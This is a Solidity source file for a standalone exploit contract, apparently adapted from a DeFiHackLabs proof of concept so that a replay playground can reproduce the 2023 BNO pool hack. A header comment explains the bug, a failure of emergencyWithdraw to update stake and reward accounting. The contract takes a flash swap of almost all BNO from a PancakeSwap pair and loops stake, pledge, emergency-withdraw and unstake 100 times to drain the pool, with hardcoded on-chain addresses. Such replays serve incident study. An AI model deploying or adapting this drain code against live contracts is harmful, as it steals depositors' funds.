// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-BNO).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (BNOTest IS the attacker contract: it implements `pancakeCall` and
// `onERC721Received` directly, and `testExploit()` is the entrypoint), so
// there is no separately-named standalone exploit contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit -> run, pancakeCall, callEmergencyWithdraw, onERC721Received)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/BNO_exp.sol, except that the pre-attack NFT
// transfer (originally `cheats.startPrank(attackerContract); NFT.transferFrom(
// attacker, address(this), 13/14)`) is replicated as a `setup` step in the
// per-PoC config instead of inline Foundry cheatcodes.
//
// Root cause: Pool.emergencyWithdraw() refunds the caller's full pledged
// principal but never decrements the global `stakeSupply`, never tears down
// the NFT weight boost (`nftAddition`/`nftAmount`), and never runs
// updatePool(). The stake/reward token is the SAME token (BNO), so every
// stale `pendingFit()` payout after emergencyWithdraw() is a free withdrawal
// from the pool's own BNO treasury. Repeating stakeNft -> pledge ->
// emergencyWithdraw -> unstakeNft 100 times (funded by a flash swap) drains
// the pool.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function approve(address to, uint256 tokenId) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPool {
    function emergencyWithdraw() external;

    function stakeNft(uint256[] memory tokenIds) external payable;

    function unstakeNft(uint256[] memory tokenIds) external payable;

    function pledge(uint256 _stakeAmount) external payable;
}

contract BNODrain {
    IERC721 constant NFT = IERC721(0x8EE0C2709a34E9FDa43f2bD5179FA4c112bEd89A);
    IERC20 constant BNO = IERC20(0xa4dBc813F7E1bf5827859e278594B1E0Ec1F710F);
    IPancakePair constant PancakePair = IPancakePair(0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD);
    IPool constant Pool = IPool(0xdCA503449899d5649D32175a255A8835A03E4006);

    // step 0: flash-swap almost the entire BNO reserve out of the pair. The
    // non-empty `data` triggers the pancakeCall callback below, which runs
    // the drain loop and repays the swap before this call returns. Payable so
    // the recorder's attackValueWei funds this contract's native balance for
    // the 100 loops of stakeNft/pledge/unstakeNft withdrawal fees below.
    function run() external payable {
        PancakePair.swap(0, BNO.balanceOf(address(PancakePair)) - 1, address(this), hex"00");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        BNO.approve(address(Pool), type(uint256).max);
        for (uint256 i; i < 100; i++) {
            callEmergencyWithdraw();
        }
        BNO.transfer(address(PancakePair), 296_077 * 1e18);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function callEmergencyWithdraw() internal {
        NFT.approve(address(Pool), 13);
        NFT.approve(address(Pool), 14);

        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 13;
        tokenIds[1] = 14;
        Pool.stakeNft{value: 0.008 ether}(tokenIds);
        Pool.pledge{value: 0.008 ether}(BNO.balanceOf(address(this)));
        // Emergency withdraw is made without withdrawing the staked NFTs
        Pool.emergencyWithdraw();
        // Stake is canceled but NFTs are still claimable
        Pool.unstakeNft{value: 0.008 ether}(tokenIds);
    }
}
